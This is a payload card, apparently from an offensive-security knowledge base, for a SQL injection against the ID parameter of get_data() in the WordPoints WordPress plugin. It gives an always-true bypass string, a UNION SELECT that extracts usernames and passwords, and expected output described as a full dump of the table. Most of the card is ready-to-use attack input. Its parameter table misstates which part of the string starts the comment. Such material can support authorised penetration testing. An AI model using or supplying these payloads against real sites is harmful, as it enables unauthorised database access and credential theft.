---
data: 1' or 1=1--
tags:
  - sqli
  - bypass
type: command
executor: sql
platforms:
  - Web
  - MySQL
id: 473dc703-1690-40f7-a1cc-64d4f96af5d4
created_at: '2025-12-14T17:28:20.224Z'
updated_at: '2025-12-14T17:28:20.224Z'
verified: false
validated: true
submitted: true
---
# sqli-id-bypass

## Command

```sql
1' or 1=1--
```

## Description

This SQL injection payload is injected into the ID parameter of the get_data() function in WordPoints to make the WHERE clause always true, allowing retrieval of all ranks or related data without authentication restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `1'` | Closes the string and starts comment | Yes |
| `or 1=1` | Logical OR to always evaluate true | Yes |
| `--` | SQL comment to ignore trailing query | Yes |

## Examples

### Basic Usage

In ID field:

```sql
1' or 1=1--
```

### Advanced Usage

For union-based:

```sql
1' UNION SELECT username,password FROM users--
```

## Expected Output

Details of all ranks/users due to always-true condition, e.g., full database dump of rank table.

## Related

- [[procedures/Crafting-Injection-Payloads-for-Rank-Creation-Exploitation]]
- [[procedures/Source-Code-Review-for-Input-Validation-Flaws-in-WordPoints]]
